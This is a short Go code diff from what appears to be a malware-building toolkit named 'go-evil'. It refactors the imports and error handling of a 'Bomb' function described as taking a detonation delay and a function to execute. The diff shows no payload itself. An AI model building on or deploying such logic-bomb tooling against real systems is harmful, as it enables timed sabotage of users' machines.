@@ -3,11 +3,11 @@ package logical
 import (
 	"fmt"
 
-	"github.com/s9rA16Bf4/Go-tools/tools"
+	tools "github.com/s9rA16Bf4/Go-tools"
 	"github.com/s9rA16Bf4/go-evil/utility/structure"
 	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
 	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
-	"github.com/s9rA16Bf4/notify_handler/go/notify"
+	notify "github.com/s9rA16Bf4/notify_handler"
 )
 
 // Input is an evil array, ${"time until detonation in ms", "execution function name"}$
@@ -16,14 +16,14 @@ func Bomb(value string, data_object *json.Json_t) []string {
 	arr := structure.Create_evil_object(value)
 
 	if arr.Length() != 2 {
-		notify.Error(fmt.Sprintf("Expected two values, but recieved %d", arr.Length()), "bombs.fork_bomb()")
+		notify.Error(fmt.Sprintf("Expected two values, but recieved %d", arr.Length()), "bombs.fork_bomb()", 1)
 	}
 
 	time := arr.Get(0)
 
-	time_i := tools.String_to_int(time)
+	time_i := tools.StringToInt(time)
 	if time_i == -1 {
-		notify.Error(fmt.Sprintf("Failed to convert '%s' to an integer", time), "bombs.fork_bomb()")
+		notify.Error(fmt.Sprintf("Failed to convert '%s' to an integer", time), "bombs.fork_bomb()", 1)
 	}
 
 	executioner := arr.Get(1)
